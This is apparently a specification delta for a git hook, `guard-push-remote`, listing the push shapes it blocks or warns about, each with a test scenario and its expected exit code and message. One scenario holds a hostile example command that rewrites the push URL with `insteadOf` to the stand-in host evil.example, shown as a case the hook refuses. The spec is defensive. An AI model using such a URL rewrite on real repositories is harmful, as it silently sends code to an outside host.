## ADDED Requirements

### Requirement: Unparsed push nudges name the branch a bare push was checked on
`guard-push-remote`'s nudges for a command the loop parser cannot read SHALL say that a bare push was checked against the branch checked out before the command runs, since a `git checkout` in the same command can send it to another remote.

#### Scenario: Unreadable chain with a branch switch
- **WHEN** a comment takes `git push origin main && git checkout other && git push` past 12 KB, in an owned checkout
- **THEN** the hook exits 0 with a nudge that says a bare push was checked against the branch checked out now

## MODIFIED Requirements

### Requirement: Push shapes the push guard refuses
`guard-push-remote` SHALL block a push whose target it read as uncertain. In a command the loop parser reads: a looped push with no remote, a bare push in a push chain that switches branch or tracking, or over four non-URL loop remotes. In any command: a URL with no `owner/repo`, a repository moved by `eval`, `trap`, `GIT_DIR`, `--git-dir` or `--work-tree`, a push URL the command rewrites, over four directory and remote pairs behind `git -C` or a subshell `cd`, or a remote git cannot resolve.

#### Scenario: Loop with no remote
- **WHEN** the command is `for b in a b; do git push; done`
- **THEN** the hook exits 2 with `git push in loop without explicit remote`

#### Scenario: Bare push in a chain that switches branch
- **WHEN** the command is `git push origin feat && git checkout main && git push`
- **THEN** the hook exits 2 with `chained git push without explicit remotes`

#### Scenario: Pushes in five directories
- **WHEN** the command is `git -C d1 push origin main && git -C d2 push origin main && git -C d3 push origin main && git -C d4 push origin main && git -C d5 push origin main`
- **THEN** the hook exits 2 with `too many push directories to verify`

#### Scenario: Rewritten push URL
- **WHEN** the command is `git -c url.https://evil.example/.insteadOf=https://github.com/ push origin main`
- **THEN** the hook exits 2 with `Cannot tell where this push goes`

#### Scenario: No push remote
- **WHEN** a bare `git push` runs in a repository with no `origin` and no configured push remote for the branch
- **THEN** the hook exits 2 with `Cannot resolve push target`
